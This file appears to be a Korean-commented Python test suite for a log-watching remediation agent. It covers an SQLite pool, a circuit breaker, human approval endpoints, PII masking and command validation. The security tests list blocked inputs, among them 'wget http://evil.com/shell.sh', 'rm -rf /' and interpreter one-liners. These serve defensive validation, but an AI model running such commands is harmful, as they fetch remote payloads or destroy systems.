"""
최종 종합 테스트 — 구현된 개선 사항 전체 검증
#1 데몬모드 블로킹 제거, #2 ChromaDB 싱글톤, #3 resolution_source 직접 사용,
#4 command 분리, #5 Slack 중복 제거, #6 Ollama 재시도, #7 SQLite 풀,
#8 threshold 스윕, #10 HALF_OPEN 경합 제거, #11 DI,
#13 error_category, #16 승인 서버
"""
import os
import sys
import tempfile
import threading
import time
import unittest
import sqlite3

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


# ─────────────────────────────────────────────────────────────
# #7 SQLite 연결 풀
# ─────────────────────────────────────────────────────────────
class TestSQLitePool(unittest.TestCase):
    def setUp(self):
        self.tf = tempfile.mktemp(suffix=".db")

    def tearDown(self):
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_same_thread_same_connection(self):
        from src.utils.sqlite_pool import get_conn
        c1 = get_conn(self.tf)
        c2 = get_conn(self.tf)
        self.assertIs(c1, c2, "같은 스레드에서 동일 연결 객체를 반환해야 한다")

    def test_wal_mode(self):
        from src.utils.sqlite_pool import get_conn
        conn = get_conn(self.tf)
        mode = conn.execute("PRAGMA journal_mode").fetchone()[0]
        self.assertEqual(mode, "wal", "WAL 모드가 활성화돼야 한다")

    def test_different_threads_different_connections(self):
        from src.utils.sqlite_pool import get_conn
        results = {}
        def worker(name):
            results[name] = id(get_conn(self.tf))
        t1 = threading.Thread(target=worker, args=("t1",))
        t2 = threading.Thread(target=worker, args=("t2",))
        t1.start(); t2.start()
        t1.join(); t2.join()
        self.assertNotEqual(results["t1"], results["t2"],
                            "다른 스레드는 다른 연결을 가져야 한다")


# ─────────────────────────────────────────────────────────────
# #10 Circuit Breaker HALF_OPEN 원자적 처리
# ─────────────────────────────────────────────────────────────
class TestCircuitBreaker(unittest.TestCase):
    def setUp(self):
        self.tf = tempfile.mktemp(suffix=".db")
        os.makedirs(os.path.dirname(os.path.abspath(self.tf)), exist_ok=True)
        from src.circuit_breaker import CircuitBreaker
        self.cb = CircuitBreaker(db_path=self.tf)
        self.err = "ERROR: Test error for circuit breaker"

    def tearDown(self):
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_closed_allows_proceed(self):
        self.assertTrue(self.cb.can_proceed(self.err))

    def test_open_after_threshold_failures(self):
        from src.circuit_breaker import FAILURE_THRESHOLD
        for _ in range(FAILURE_THRESHOLD):
            self.cb.record_result(self.err, success=False)
        self.assertFalse(self.cb.can_proceed(self.err))

    def test_success_resets_to_closed(self):
        self.cb.record_result(self.err, success=False)
        self.cb.record_result(self.err, success=True)
        self.assertTrue(self.cb.can_proceed(self.err))

    def test_half_open_only_one_test_request(self):
        """여러 스레드가 동시에 HALF_OPEN 진입 시 단 1개만 허용"""
        from src.circuit_breaker import FAILURE_THRESHOLD, STATE_OPEN, STATE_HALF_OPEN
        sig = self.cb._sig(self.err)
        # 강제로 HALF_OPEN 상태 + test_in_progress=0 세팅
        past = "2000-01-01T00:00:00+00:00"
        self.cb._write(sig, STATE_HALF_OPEN, FAILURE_THRESHOLD, past, test_in_progress=0)

        results = []
        def try_proceed():
            results.append(self.cb._try_claim_half_open(sig, elapsed=None))

        threads = [threading.Thread(target=try_proceed) for _ in range(10)]
        for t in threads: t.start()
        for t in threads: t.join()

        self.assertEqual(results.count(True), 1,
                         "HALF_OPEN에서 정확히 1개 스레드만 허용돼야 한다")

    def test_get_status_fields(self):
        status = self.cb.get_status(self.err)
        self.assertIn("state",            status)
        self.assertIn("failures",         status)
        self.assertIn("test_in_progress", status)


# ─────────────────────────────────────────────────────────────
# #7+#13 Observability — sqlite_pool + error_category
# ─────────────────────────────────────────────────────────────
class TestObservability(unittest.TestCase):
    def setUp(self):
        self.tf = tempfile.mktemp(suffix=".db")
        from src.observability import AgentObserver
        self.obs = AgentObserver(db_path=self.tf)

    def tearDown(self):
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_log_event_with_error_category(self):
        self.obs.log_event(
            error_log="ERROR: OOM test",
            source="L1_CACHE",
            action_type="CLEAR_MEMORY",
            latency_sec=0.05,
            success=True,
            result_category="SUCCESS",
            error_category="Out_Of_Memory",
        )
        conn = sqlite3.connect(self.tf)
        row = conn.execute("SELECT error_category FROM metrics ORDER BY id DESC LIMIT 1").fetchone()
        conn.close()
        self.assertEqual(row[0], "Out_Of_Memory")

    def test_error_category_column_exists(self):
        conn = sqlite3.connect(self.tf)
        cols = {r[1] for r in conn.execute("PRAGMA table_info(metrics)")}
        conn.close()
        self.assertIn("error_category", cols)

    def test_null_error_category_allowed(self):
        """error_category 없이도 기록 가능 (하위 호환)"""
        self.obs.log_event(
            error_log="CRITICAL: disk full",
            source="RULE",
            action_type="ESCALATE_TO_HUMAN",
            latency_sec=0.01,
            success=False,
        )
        conn = sqlite3.connect(self.tf)
        cnt = conn.execute("SELECT COUNT(*) FROM metrics").fetchone()[0]
        conn.close()
        self.assertGreater(cnt, 0)


# ─────────────────────────────────────────────────────────────
# #11 LogTailHandler DI
# ─────────────────────────────────────────────────────────────
class TestLogTailHandlerDI(unittest.TestCase):
    def test_custom_injected_objects(self):
        from unittest.mock import MagicMock
        from src.utils.debouncer import LogDebouncer
        from src.log_watcher import LogTailHandler

        tf = tempfile.mktemp(suffix=".log")
        open(tf, "w").write("test\n")
        debouncer = LogDebouncer(30)

        mock_executor = MagicMock()
        mock_observer = MagicMock()
        mock_engine   = MagicMock()
        mock_cb       = MagicMock()

        handler = LogTailHandler(
            tf, debouncer,
            executor=mock_executor,
            observer_agent=mock_observer,
            engine=mock_engine,
            circuit_breaker=mock_cb,
        )
        self.assertIs(handler.executor, mock_executor)
        self.assertIs(handler.observer_agent, mock_observer)
        self.assertIs(handler.engine, mock_engine)
        self.assertIs(handler.circuit_breaker, mock_cb)
        os.unlink(tf)

    def test_default_objects_when_no_injection(self):
        """실 DB·ChromaDB 접근 없이 기본 타입 인스턴스화만 검증."""
        from unittest.mock import patch, MagicMock
        from src.utils.debouncer import LogDebouncer
        from src.log_watcher import LogTailHandler

        tf = tempfile.mktemp(suffix=".log")
        open(tf, "w").write("test\n")
        debouncer = LogDebouncer(30)

        # 실제 DB·ChromaDB 접근을 막고, 올바른 클래스가 호출됐는지 확인
        with patch("src.log_watcher.ActionExecutor") as MockEx, \
             patch("src.log_watcher.AgentObserver") as MockObs, \
             patch("src.log_watcher.RAGEngine") as MockEng, \
             patch("src.log_watcher.CircuitBreaker") as MockCB:
            LogTailHandler(tf, debouncer)
            MockEx.assert_called_once()
            MockObs.assert_called_once()
            MockEng.assert_called_once()
            MockCB.assert_called_once()
        os.unlink(tf)


# ─────────────────────────────────────────────────────────────
# #1+#4 executor — command validation + isatty branch
# ─────────────────────────────────────────────────────────────
class TestExecutorSecurity(unittest.TestCase):
    def setUp(self):
        from src.executor import ActionExecutor
        self.ex = ActionExecutor()

    def test_whitelist_pass(self):
        tokens, err = self.ex._validate_command("systemctl restart nginx")
        self.assertIsNone(err)
        self.assertEqual(tokens[0], "systemctl")

    def test_blacklist_block(self):
        _, err = self.ex._validate_command("rm -rf /")
        self.assertIsNotNone(err)
        self.assertEqual(err["error_type"], "SecurityBlock")

    def test_shell_metachar_block(self):
        _, err = self.ex._validate_command("echo foo | cat")
        self.assertIsNotNone(err)
        self.assertIn("메타문자", err["error_detail"])

    def test_unknown_command_block(self):
        _, err = self.ex._validate_command("wget http://evil.com/shell.sh")
        self.assertIsNotNone(err)

    def test_interpreter_block(self):
        for cmd in ["python3 -c 'import os'", "bash -c id", "perl -e 'system(id)'"]:
            _, err = self.ex._validate_command(cmd)
            self.assertIsNotNone(err, f"인터프리터 '{cmd}' 차단 실패")

    def test_empty_command(self):
        _, err = self.ex._validate_command("")
        self.assertIsNotNone(err)


# ─────────────────────────────────────────────────────────────
# #16 Approval Store
# ─────────────────────────────────────────────────────────────
class TestApprovalStore(unittest.TestCase):
    def setUp(self):
        import src.approval_store as store
        self.store = store
        self.orig_db = store._DB_PATH
        self.tf = tempfile.mktemp(suffix=".db")
        store._DB_PATH = self.tf
        store.init_table()

    def tearDown(self):
        self.store._DB_PATH = self.orig_db
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_create_and_get_pending(self):
        token = self.store.create_request("systemctl restart nginx", "ERROR", "test")
        self.assertEqual(self.store.get_status(token), "pending")

    def test_approve(self):
        token = self.store.create_request("free -m", "ERROR", "test")
        ok = self.store.set_decision(token, "approved")
        self.assertTrue(ok)
        self.assertEqual(self.store.get_status(token), "approved")

    def test_reject(self):
        token = self.store.create_request("df -h", "ERROR", "test")
        ok = self.store.set_decision(token, "rejected")
        self.assertTrue(ok)
        self.assertEqual(self.store.get_status(token), "rejected")

    def test_double_decide_fails(self):
        """이미 결정된 요청은 다시 변경 불가"""
        token = self.store.create_request("uptime", "ERROR", "test")
        self.store.set_decision(token, "approved")
        ok = self.store.set_decision(token, "rejected")
        self.assertFalse(ok)
        self.assertEqual(self.store.get_status(token), "approved")

    def test_unknown_token_returns_none(self):
        self.assertIsNone(self.store.get_status("nonexistent_token_xyz"))


# ─────────────────────────────────────────────────────────────
# #16 Approval Server endpoints
# ─────────────────────────────────────────────────────────────
class TestApprovalServer(unittest.TestCase):
    def setUp(self):
        from fastapi.testclient import TestClient
        import src.approval_store as store
        self.store = store
        self.orig_db = store._DB_PATH
        self.tf = tempfile.mktemp(suffix=".db")
        store._DB_PATH = self.tf
        store.init_table()
        from src.approval_server import app
        self.client = TestClient(app)

    def tearDown(self):
        self.store._DB_PATH = self.orig_db
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_approve_endpoint(self):
        token = self.store.create_request("systemctl status nginx", "ERROR", "test")
        resp  = self.client.get(f"/approve/{token}")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(self.store.get_status(token), "approved")

    def test_reject_endpoint(self):
        token = self.store.create_request("uptime", "ERROR", "test")
        resp  = self.client.get(f"/reject/{token}")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(self.store.get_status(token), "rejected")

    def test_already_decided_returns_409(self):
        token = self.store.create_request("free", "ERROR", "test")
        self.client.get(f"/approve/{token}")
        resp = self.client.get(f"/approve/{token}")
        self.assertEqual(resp.status_code, 409)

    def test_unknown_token_returns_404(self):
        resp = self.client.get("/approve/invalid_token_xyz")
        self.assertEqual(resp.status_code, 404)

    def test_health_endpoint(self):
        resp = self.client.get("/health")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()["status"], "ok")


# ─────────────────────────────────────────────────────────────
# #3+#8 schemas — AgentResponse 필드 검증
# ─────────────────────────────────────────────────────────────
class TestSchemas(unittest.TestCase):
    def test_agent_response_has_resolution_source(self):
        from src.schemas import AgentResponse, ActionType
        r = AgentResponse(
            error_category="OOM",
            severity="HIGH",
            action_type=ActionType.CLEAR_MEMORY,
        )
        self.assertEqual(r.resolution_source, "L1_CACHE")
        self.assertIsNone(r.command)

    def test_agent_response_with_command(self):
        from src.schemas import AgentResponse, ActionType
        r = AgentResponse(
            error_category="DB_Connection",
            severity="MEDIUM",
            action_type=ActionType.EXECUTE_LLM_COMMAND,
            command="systemctl restart postgresql",
            resolution_source="L2_LLM",
        )
        self.assertEqual(r.command, "systemctl restart postgresql")
        self.assertEqual(r.resolution_source, "L2_LLM")


# ─────────────────────────────────────────────────────────────
# #8 Threshold 스윕 결과 반영 확인
# ─────────────────────────────────────────────────────────────
class TestThresholdApplied(unittest.TestCase):
    def test_threshold_value_reasonable(self):
        """THRESHOLD 상수가 llm_engine.py에 합리적인 값으로 정의돼 있는지 확인"""
        import re
        with open("src/llm_engine.py", encoding="utf-8") as f:
            content = f.read()
        # "THRESHOLD = 1.2" 형태 또는 "if distance > 1.2" 형태 모두 허용
        m = (re.search(r"THRESHOLD\s*=\s*(\d+\.\d+)", content) or
             re.search(r"if distance\s*[><=]+\s*(\d+\.\d+)", content))
        self.assertIsNotNone(m, "THRESHOLD 정의 또는 distance 비교 구문을 찾지 못했다")
        threshold = float(m.group(1))
        self.assertGreater(threshold, 0.0)
        self.assertLess(threshold, 2.0, f"threshold={threshold}이 비합리적으로 크다")


# ─────────────────────────────────────────────────────────────
# #15 PII 마스킹
# ─────────────────────────────────────────────────────────────
class TestPIIMasker(unittest.TestCase):
    def _mask(self, text):
        from src.utils.pii_masker import mask
        return mask(text)

    def test_ipv4_masked(self):
        self.assertIn("<IP>", self._mask("host=192.168.1.100 failed"))

    def test_email_masked(self):
        self.assertIn("<EMAIL>", self._mask("user admin@corp.com not found"))

    def test_password_masked(self):
        result = self._mask("password=supersecret123")
        self.assertNotIn("supersecret123", result)
        self.assertIn("<REDACTED>", result)

    def test_aws_key_masked(self):
        self.assertIn("<AWS_KEY>", self._mask("key=AKIAIOSFODNN7EXAMPLE"))

    def test_safe_text_unchanged(self):
        safe = "ERROR: disk full on /var/log"
        self.assertEqual(self._mask(safe), safe)


# ─────────────────────────────────────────────────────────────
# #14 EXECUTE_RULE_COMMAND ActionType
# ─────────────────────────────────────────────────────────────
class TestRuleCommandActionType(unittest.TestCase):
    def test_rule_command_distinct_from_llm(self):
        from src.schemas import ActionType
        self.assertNotEqual(
            ActionType.EXECUTE_RULE_COMMAND,
            ActionType.EXECUTE_LLM_COMMAND,
        )

    def test_executor_handles_rule_command(self):
        from src.schemas import ActionType, AgentResponse
        from src.executor import ActionExecutor
        import os
        os.environ["AUTO_APPROVE"] = "true"
        ex = ActionExecutor()
        resp = AgentResponse(
            error_category="Test",
            severity="LOW",
            action_type=ActionType.EXECUTE_RULE_COMMAND,
            command="uptime",
            resolution_source="RULE",
        )
        result = ex.execute(resp, original_error_log="test")
        os.environ.pop("AUTO_APPROVE", None)
        self.assertIn(result["result_category"], {"SUCCESS", "FAILURE", "IMPOSSIBLE"})


# ─────────────────────────────────────────────────────────────
# #9 n_results=5 앙상블 — 코드 검증
# ─────────────────────────────────────────────────────────────
class TestEnsembleQuery(unittest.TestCase):
    def test_n_results_is_5(self):
        import re
        with open("src/llm_engine.py", encoding="utf-8") as f:
            content = f.read()
        m = re.search(r"n_results\s*=\s*(\d+)", content)
        self.assertIsNotNone(m)
        self.assertEqual(int(m.group(1)), 5)

    def test_threshold_constant_defined(self):
        import re
        with open("src/llm_engine.py", encoding="utf-8") as f:
            content = f.read()
        self.assertIn("THRESHOLD", content)


# ─────────────────────────────────────────────────────────────
# #17 ErrorClusterer
# ─────────────────────────────────────────────────────────────
class TestErrorClusterer(unittest.TestCase):
    def test_returns_none_when_sklearn_missing_or_empty(self):
        from src.error_clusterer import ErrorClusterer, _SKLEARN_AVAILABLE
        from unittest.mock import MagicMock
        mock_col = MagicMock()
        mock_col.count.return_value = 5  # < _MIN_VECTORS=20
        ec = ErrorClusterer(chroma_collection=mock_col)
        result = ec.run()
        self.assertIsNone(result)


# ─────────────────────────────────────────────────────────────
# #18 멀티 로그 파일 시그니처 검증
# ─────────────────────────────────────────────────────────────
class TestMultiLogWatch(unittest.TestCase):
    def test_start_watching_accepts_list(self):
        import inspect
        from src.log_watcher import start_watching
        sig = inspect.signature(start_watching)
        param = list(sig.parameters.values())[0]
        # 타입 힌트가 str | List[str] 포함하는지 확인
        ann = str(param.annotation)
        self.assertTrue("str" in ann or "List" in ann)


# ─────────────────────────────────────────────────────────────
# #19 JSON 로깅
# ─────────────────────────────────────────────────────────────
class TestJSONLogging(unittest.TestCase):
    def test_setup_json_logging_does_not_raise(self):
        from src.utils.logging_config import setup_json_logging
        try:
            setup_json_logging()
        except Exception as e:
            self.fail(f"setup_json_logging() raised: {e}")

    def test_fallback_when_no_jsonlogger(self):
        import sys
        from src.utils import logging_config as lc
        orig = lc._JSON_AVAILABLE
        lc._JSON_AVAILABLE = False
        try:
            lc.setup_json_logging()
        except Exception as e:
            self.fail(f"폴백 모드에서 예외 발생: {e}")
        finally:
            lc._JSON_AVAILABLE = orig


# ─────────────────────────────────────────────────────────────
# #12 pyproject.toml 존재 + sys.path.insert 제거 확인
# ─────────────────────────────────────────────────────────────
class TestPackageSetup(unittest.TestCase):
    def test_pyproject_toml_exists(self):
        import os
        self.assertTrue(os.path.exists("pyproject.toml"))

    def test_no_sys_path_insert_in_llm_engine(self):
        with open("src/llm_engine.py", encoding="utf-8") as f:
            content = f.read()
        self.assertNotIn("sys.path.insert", content)

    def test_no_sys_path_insert_in_log_watcher(self):
        with open("src/log_watcher.py", encoding="utf-8") as f:
            content = f.read()
        self.assertNotIn("sys.path.insert", content)


# ─────────────────────────────────────────────────────────────
# Debouncer 정규화 키 (#7 고도화)
# ─────────────────────────────────────────────────────────────
class TestDebouncerNormalization(unittest.TestCase):
    def setUp(self):
        from src.utils.debouncer import LogDebouncer
        self.d = LogDebouncer(cooldown_seconds=30)

    def test_different_pids_same_bucket(self):
        """PID가 달라도 같은 에러 패턴으로 묶인다."""
        from src.utils.debouncer import LogDebouncer
        e1 = "ERROR: OOM killer invoked for pid 1234 nginx"
        e2 = "ERROR: OOM killer invoked for pid 5678 nginx"
        self.assertEqual(LogDebouncer._normalize(e1), LogDebouncer._normalize(e2))

    def test_different_ips_same_bucket(self):
        """IP가 달라도 같은 Connection refused로 묶인다."""
        from src.utils.debouncer import LogDebouncer
        e1 = "ERROR: Connection refused to 10.0.0.1:8080"
        e2 = "ERROR: Connection refused to 192.168.1.1:9090"
        self.assertEqual(LogDebouncer._normalize(e1), LogDebouncer._normalize(e2))

    def test_different_error_types_different_buckets(self):
        """다른 에러 패턴은 다른 버킷."""
        from src.utils.debouncer import LogDebouncer
        self.assertNotEqual(
            LogDebouncer._normalize("ERROR: OOM killer invoked"),
            LogDebouncer._normalize("ERROR: Connection refused"),
        )

    def test_second_similar_error_suppressed(self):
        """첫 에러 처리 후 독립 숫자(PID)만 다른 유사 에러는 쿨타임 중 무시."""
        e1 = "ERROR: OOM killer invoked for pid 111"
        e2 = "ERROR: OOM killer invoked for pid 222"
        self.assertTrue(self.d.should_process(e1))
        self.assertFalse(self.d.should_process(e2))


# ─────────────────────────────────────────────────────────────
# Approval 토큰 만료 (#4 인증 강화)
# ─────────────────────────────────────────────────────────────
class TestApprovalTokenExpiry(unittest.TestCase):
    def setUp(self):
        import src.approval_store as store
        self.store = store
        self.orig_db = store._DB_PATH
        self.tf = tempfile.mktemp(suffix=".db")
        store._DB_PATH = self.tf
        store.init_table()

    def tearDown(self):
        self.store._DB_PATH = self.orig_db
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_token_pending_before_expiry(self):
        token = self.store.create_request("uptime", "ERR", "")
        self.assertEqual(self.store.get_status(token), "pending")

    def test_token_expired_after_expiry_time(self):
        """expires_at을 과거로 조작해 만료 처리 확인."""
        import sqlite3
        from datetime import datetime, timedelta, timezone
        token = self.store.create_request("uptime", "ERR", "")
        past = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()
        conn = sqlite3.connect(self.tf)
        conn.execute("UPDATE pending_approvals SET expires_at=? WHERE token=?", (past, token))
        conn.commit()
        conn.close()
        self.assertEqual(self.store.get_status(token), "expired")

    def test_get_request_returns_command(self):
        token = self.store.create_request("systemctl restart nginx", "ERR", "")
        req = self.store.get_request(token)
        self.assertIsNotNone(req)
        self.assertEqual(req["command"], "systemctl restart nginx")

    def test_pending_page_returns_200(self):
        from fastapi.testclient import TestClient
        from src.approval_server import app
        token = self.store.create_request("uptime", "ERR", "")
        resp = TestClient(app).get(f"/pending/{token}")
        self.assertEqual(resp.status_code, 200)
        self.assertIn("uptime", resp.text)


# ─────────────────────────────────────────────────────────────
# ChromaDB 배치 쿼리 (#6)
# ─────────────────────────────────────────────────────────────
class TestBatchQuery(unittest.TestCase):
    def test_analyze_errors_batch_method_exists(self):
        from src.llm_engine import RAGEngine
        self.assertTrue(hasattr(RAGEngine, "analyze_errors_batch"))

    def test_batch_empty_input_returns_empty(self):
        from unittest.mock import MagicMock, patch
        with patch("src.llm_engine._get_chroma_client") as mock_client, \
             patch("src.llm_engine._ollama_warmup"):
            mock_col = MagicMock()
            mock_col.count.return_value = 0
            mock_col.get_collection.side_effect = Exception("no col")
            mock_client.return_value.get_collection.side_effect = Exception("no col")
            mock_client.return_value.get_or_create_collection.return_value = mock_col
            from src.llm_engine import RAGEngine
            engine = RAGEngine()
            result = engine.analyze_errors_batch([])
            self.assertEqual(result, [])

    def test_build_response_from_meta_includes_target_process(self):
        """_build_response_from_meta가 target_process를 올바르게 채운다."""
        from src.llm_engine import _build_response_from_meta
        meta = {
            "action_type":    "kill_process",
            "target_process": "nginx",
            "error_category": "OOM",
            "reasoning":      "test",
        }
        resp = _build_response_from_meta(meta, "L1_CACHE")
        self.assertEqual(resp.target_process, "nginx")


# ─────────────────────────────────────────────────────────────
# 에러 복구 검증 (#2)
# ─────────────────────────────────────────────────────────────
class TestRecoveryVerification(unittest.TestCase):
    def setUp(self):
        from src.executor import ActionExecutor
        self.ex = ActionExecutor()

    def test_verify_process_dead_nonexistent(self):
        """존재하지 않는 프로세스 → 이미 종료된 것으로 간주(True)."""
        result = self.ex._verify_process_dead("nonexistent_proc_xyz_abc", wait_sec=0)
        self.assertTrue(result)

    def test_verify_service_active_nonexistent(self):
        """존재하지 않는 서비스 → False."""
        result = self.ex._verify_service_active("nonexistent_svc_xyz_abc", wait_sec=0)
        self.assertFalse(result)

    def test_verification_methods_exist(self):
        self.assertTrue(hasattr(self.ex, "_verify_process_dead"))
        self.assertTrue(hasattr(self.ex, "_verify_service_active"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
